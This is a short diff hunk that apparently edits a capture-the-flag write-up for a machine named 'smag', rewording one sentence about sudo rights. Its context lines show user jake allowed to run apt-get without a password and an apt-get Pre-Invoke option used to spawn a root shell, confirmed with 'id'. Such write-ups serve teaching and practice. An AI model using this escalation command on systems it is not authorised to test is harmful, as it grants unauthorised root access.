@@ -113,7 +113,7 @@ Nmap done: 1 IP address (1 host up) scanned in 59.42 seconds
       User jake may run the following commands on smag:
       (ALL : ALL) NOPASSWD: /usr/bin/apt-get
     
-      We dont password for binary to execute.
+      We don't need password for binary to get privilege.
     
       *sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
       # id
